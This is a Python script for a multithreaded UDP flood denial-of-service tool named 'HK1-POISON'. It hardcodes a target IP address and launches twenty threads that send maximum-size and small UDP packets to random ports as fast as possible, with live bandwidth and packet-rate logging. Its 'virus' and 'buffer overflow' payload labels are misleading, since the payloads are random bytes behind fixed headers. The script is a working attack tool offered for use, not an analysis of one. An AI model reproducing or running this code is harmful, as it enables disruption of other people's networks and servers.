import socket
import threading
import time
import random
import struct

# Target
TARGET = "62.109.121.42"  # Change this

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

# POISON PAYLOAD TYPES
POISON_TYPES = {
    "MEMEAT": b"\xDE\xAD\xBE\xEF",  # Memory eater
    "CPUSPK": b"\xBA\xDF\x00\xD0",  # CPU spiker  
    "STACOR": b"\xCA\xFE\xBA\xBE",  # State corruptor
    "BUFOVR": b"\x00\xFF\xFF\x00",  # Buffer overflow
    "CHKKIL": b"\xFF\xFF\x00\x00",  # Checksum killer
    "REPLIC": b"\xAA\x55\xAA\x55",  # Replication virus
    "FRAGME": b"\xF0\x0F\xF0\x0F",  # Memory fragmenter
    "TIMEPO": b"\xCC\xCC\xCC\xCC",  # Time poison
}

# Stats
bandwidth_sent = 0
pps_sent = 0
poison_counts = {name: 0 for name in POISON_TYPES}
stats_lock = threading.Lock()

# Generate virus poison payload
def generate_poison_payload(size, force_type=None):
    """Create virus-structured poison payload"""
    if force_type:
        poison_type = force_type
        poison_sig = POISON_TYPES[poison_type]
    else:
        poison_type = random.choice(list(POISON_TYPES.keys()))
        poison_sig = POISON_TYPES[poison_type]
    
    # Virus structure
    virus_header = poison_sig  # 4 bytes: poison signature
    
    replication_code = random.randbytes(16)  # Simulated replication
    
    corruption_seed = struct.pack("Q", random.getrandbits(64))  # 8 bytes corruption pattern
    
    trigger_condition = struct.pack("I", random.randint(1000, 9999))  # 4 bytes trigger
    
    # Remaining bytes as overflow padding with corruption patterns
    remaining = size - 32  # 4+16+8+4 = 32 bytes used
    if remaining > 0:
        # Create pattern that looks like corrupted data
        overflow = bytearray()
        for _ in range(remaining):
            if random.random() < 0.3:  # 30% corruption bytes
                overflow.append(random.choice([0x00, 0xFF, 0x80, 0x7F]))
            else:
                overflow.append(random.randint(0, 255))
        overflow_padding = bytes(overflow)
    else:
        overflow_padding = b""
    
    # Malformed checksum at end (purposely wrong)
    checksum_poison = struct.pack("H", random.getrandbits(16))
    
    payload = virus_header + replication_code + corruption_seed + trigger_condition + overflow_padding + checksum_poison
    
    return payload[:size], poison_type  # Ensure exact size

# BANDWIDTH ATTACK (8 threads) - Max size poison
def bandwidth_poison():
    """Max UDP size packets (1472 bytes) with heavy poison"""
    global bandwidth_sent
    
    # Create socket once and reuse
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    
    # Pre-generate some poison payloads for speed
    poison_cache = []
    for _ in range(20):
        payload, ptype = generate_poison_payload(1472)  # Max UDP payload
        poison_cache.append((payload, ptype))
    
    cache_idx = 0
    
    while True:
        try:
            # Get poison payload
            if cache_idx >= len(poison_cache):
                payload, ptype = generate_poison_payload(1472)
                poison_cache.append((payload, ptype))
            else:
                payload, ptype = poison_cache[cache_idx]
            
            cache_idx = (cache_idx + 1) % len(poison_cache)
            
            # Random target port
            port = random.randint(1, 65535)
            
            # SEND POISON
            sock.sendto(payload, (TARGET, port))
            
            # Update stats
            with stats_lock:
                bandwidth_sent += len(payload)
                poison_counts[ptype] += 1
            
        except:
            pass

# PPS ATTACK (12 threads) - Small fast poison packets
def pps_poison():
    """Small UDP packets (64-512 bytes) at maximum rate"""
    global pps_sent
    
    # Multiple sockets for more speed
    socks = []
    for _ in range(3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            sock.settimeout(0.001)
            socks.append(sock)
        except:
            pass
    
    if not socks:
        return
    
    sock_idx = 0
    
    # Pre-generate small poison payloads
    small_poisons = []
    for size in [64, 128, 256, 512]:
        for _ in range(10):
            payload, ptype = generate_poison_payload(size)
            small_poisons.append((payload, ptype))
    
    poison_idx = 0
    
    while True:
        try:
            # Get small poison
            if poison_idx >= len(small_poisons):
                size = random.choice([64, 128, 256, 512])
                payload, ptype = generate_poison_payload(size)
                small_poisons.append((payload, ptype))
            else:
                payload, ptype = small_poisons[poison_idx]
            
            poison_idx = (poison_idx + 1) % len(small_poisons)
            
            # Random port
            port = random.randint(1, 65535)
            
            # Select socket
            sock = socks[sock_idx % len(socks)]
            sock_idx += 1
            
            # RAPID FIRE POISON
            sock.sendto(payload, (TARGET, port))
            
            # Update stats
            with stats_lock:
                pps_sent += 1
                poison_counts[ptype] += 1
            
        except:
            # Try to recreate socket if broken
            try:
                socks[sock_idx % len(socks)] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# Start HK1-POISON attack
def start_hk1_poison():
    print(f"{RED}{'='*60}{RESET}")
    print(f"{MAGENTA}HK1-POISON INITIALIZED{RESET}")
    print(f"{RED}Target: {TARGET}{RESET}")
    print(f"{YELLOW}Threads: 20 total (8 bandwidth + 12 PPS){RESET}")
    print(f"{YELLOW}Poison Types: {len(POISON_TYPES)} virus payloads{RESET}")
    print(f"{RED}ATTACK: 100% L4 UDP POISON{RESET}")
    print(f"{RED}{'='*60}{RESET}")
    
    # Start bandwidth poison threads
    for _ in range(8):
        threading.Thread(target=bandwidth_poison, daemon=True).start()
    
    # Start PPS poison threads  
    for _ in range(12):
        threading.Thread(target=pps_poison, daemon=True).start()

# Start attack
start_hk1_poison()

# Logging
last_log = time.time()
start_time = time.time()

while True:
    time.sleep(0.01)  # Minimal sleep for fast updates
    current = time.time()
    
    if current - last_log >= 1:  # Log every 1 second
        with stats_lock:
            # Calculate bandwidth in Mbps
            bandwidth_bytes = bandwidth_sent
            bandwidth_mbps = (bandwidth_bytes * 8) / (1024 * 1024)  # Bytes to megabits
            
            # Get PPS rate
            pps_rate = pps_sent
            
            # Find active poison types (most used)
            active_poisons = []
            for ptype, count in poison_counts.items():
                if count > 0:
                    active_poisons.append(f"{ptype}:{count}")
            
            # Sort by usage
            active_poisons.sort(key=lambda x: int(x.split(":")[1]), reverse=True)
            top_poisons = active_poisons[:3]  # Top 3 most used
            
            # Build poison string
            if top_poisons:
                poison_str = ",".join(top_poisons)
            else:
                poison_str = "NONE"
            
            # Display HK1-POISON log
            elapsed = int(current - start_time)
            print(f"{RED}HK1-POISON: @{TARGET} | BAND: {bandwidth_mbps:.1f}Mbps | PPS: {pps_rate}/s | POISON: {poison_str}{RESET}")
            
            # Reset counters for next second
            bandwidth_sent = 0
            pps_sent = 0
            poison_counts = {name: 0 for name in POISON_TYPES}
        
        last_log = current
